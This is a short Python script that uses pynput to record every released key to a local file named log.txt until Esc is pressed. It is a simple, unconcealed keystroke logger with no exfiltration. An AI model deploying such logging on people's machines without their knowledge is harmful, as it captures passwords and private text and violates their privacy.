from pynput.keyboard import Key, Controller, Listener

keyboard = Controller()
# write for easy debugging
f = open("log.txt", "w")

ks = {Key.space: " ", Key.enter: "[ENTER]\n", Key.backspace: "[BACKSPACE]"}


def on_release(key):
    # print(f"Key {key} pressed")
    if key == Key.esc:
        # stop listener
        return False
    f.write(ks.get(key, str(key)).replace("'", ""))


def main():
    # collect events until released
    with Listener(on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
